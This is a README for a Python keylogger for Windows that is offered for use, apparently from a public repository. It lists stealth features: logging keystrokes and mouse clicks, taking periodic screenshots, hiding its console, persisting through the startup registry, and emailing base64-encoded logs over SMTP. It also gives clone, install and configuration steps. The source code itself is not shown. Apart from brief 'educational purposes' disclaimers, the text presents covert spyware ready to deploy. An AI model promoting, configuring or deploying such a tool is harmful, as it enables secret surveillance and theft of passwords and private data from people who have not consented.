# Key Logger Tool

## Overview
This project is a comprehensive system monitoring tool developed in Python. It captures and logs user activities, including keystrokes and mouse events, takes periodic screenshots, and sends the collected data to a specified email address. Designed to run stealthily in the background, this tool also includes functionality to start automatically with the system.

## Features
- **Keystroke Logging**: Records all keystrokes along with window titles and timestamps.
- **Mouse Event Logging**: Logs all mouse button clicks with window names, button types, and screen positions.
- **Screenshot Capture**: Periodically captures screenshots of the user's screen.
- **Stealth Operations**: Hides the console window and adds itself to the Windows startup registry key.
- **Data Transmission**: Sends logs and screenshots to a designated email address using SMTP, with data encoded in base64.
- **Automated Timing**: Configurable intervals for data collection and email transmission.

## Requirements
- Python 2.x or 3.x
- Libraries: `pyHook`, `pyautogui`, `smtplib`, `base64`, `pythoncom`, `win32api`, `win32console`, `win32gui`
- Windows operating system

## Installation
1. **Clone the repository**:
    ```bash
    git clone https://github.com/ravip1s/key-logger.git
    cd key-logger
    ```

2. **Install required libraries**:
    ```bash
    pip install pyHook pyautogui
    ```

3. **Configure settings**:
    Edit the script to include your email credentials and the recipient email address:
    ```python
    yourgmail = "your_email@gmail.com"
    yourgmailpass = "your_password"
    sendto = "recipient_email@example.com"
    interval = 60  # Time to wait before sending data to email (in seconds)
    ```

4. **Run the script**:
    ```bash
    python keylogger.py
    ```

## Usage
Once the script is running, it will log keystrokes and mouse events, capture screenshots, and send the data to the specified email address at the defined intervals. The tool will start automatically with the system and run in the background.

## Security Note
This tool is intended for educational purposes and authorized use only. Unauthorized use of monitoring tools is illegal and unethical. Ensure you have permission before deploying this tool on any system.

## Contribution
Contributions are welcome! Please fork this repository and submit pull requests for any enhancements or bug fixes.


## Disclaimer
This project is for educational purposes only. The author is not responsible for any misuse or damage caused by this tool.

